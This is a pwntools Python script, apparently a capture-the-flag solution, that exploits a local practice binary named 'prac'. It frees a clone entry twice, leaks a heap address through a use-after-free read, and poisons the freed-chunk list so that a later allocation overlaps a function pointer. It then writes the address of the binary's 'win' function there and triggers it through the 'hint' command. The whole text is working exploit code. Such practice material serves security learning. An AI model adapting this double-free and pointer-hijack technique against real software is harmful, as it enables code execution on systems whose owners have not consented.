from pwn import *

p = process('./prac')
elf = p.elf

def menu():
    p.recvuntil(b'Choice: ')

def make(index,name):
    log.info('Make: {}'.format(index))
    p.sendline(b'a')
    p.sendlineafter(b'Clone ID:', index)
    p.sendlineafter(b'Enter Name', name)
    menu()

def edit(index,name):
    log.info('Edit: {}'.format(index))
    p.sendline(b'c')
    p.sendlineafter(b'Clone ID: ', index)
    p.sendlineafter(b'Enter Name', name)
    menu()

def kill(index):
    log.info('Kill: {}'.format(index))
    p.sendline(b'b')
    p.sendlineafter(b'Clone ID:', index)
    menu()

def view(index):
    log.info('View: {}'.format(index))
    p.sendline(b'd')
    p.sendlineafter(b'Clone ID: ', index)
    p.recvuntil(b'Name: ',timeout=0.1)
    result = p.recvline()
    menu()
    return result[:4]

def hint(index):
    log.info('Hint: {}'.format(index))
    p.sendline(b'h')
    p.sendlineafter(b'Clone ID: ', index)
    return p.recvline()

make(b'0', b'AAAAAAAA')

kill(b'0')
kill(b'0')
heap_address = u32(view(b'0'))

# 1's next now points at 1->hint()
edit(b'0', p32(heap_address + 8))

pause()
# 0 == 1
make(b'1', 'BBBBBBBB')

pause()
# 2 == *1->hint()
make(b'2', p32(elf.symbols['win']))

pause()
# replace 4->name (pointing to 1->hint) with win()
hint(b'1')

p.interactive()
